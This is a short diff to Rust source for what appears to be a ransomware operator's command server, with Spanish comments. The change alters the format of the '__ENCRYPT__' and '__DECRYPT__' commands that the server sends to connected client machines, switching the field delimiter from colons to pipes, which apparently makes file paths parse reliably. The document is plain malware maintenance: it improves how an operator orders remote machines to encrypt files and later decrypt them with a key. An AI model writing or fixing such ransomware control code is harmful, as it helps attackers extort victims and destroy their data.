@@ -1059,7 +1059,7 @@ async fn main() {
                             println!();
                             
                             // Ejecutar ransomware
-                            let encrypt_cmd = format!("__ENCRYPT__:{}:{}", path, max_depth);
+                            let encrypt_cmd = format!("__ENCRYPT__:{}|{}", path, max_depth);
                             if let Err(e) = client.tx.send(encrypt_cmd) {
                                 error!("[{}] Error enviando comando __ENCRYPT__: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
@@ -1173,7 +1173,7 @@ async fn main() {
                             println!();
                             
                             // Ejecutar desencriptación
-                            let decrypt_cmd = format!("__DECRYPT__:{}:{}:{}", path, key, max_depth);
+                            let decrypt_cmd = format!("__DECRYPT__:{}|{}|{}", path, key, max_depth);
                             if let Err(e) = client.tx.send(decrypt_cmd) {
                                 error!("[{}] Error enviando comando __DECRYPT__: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
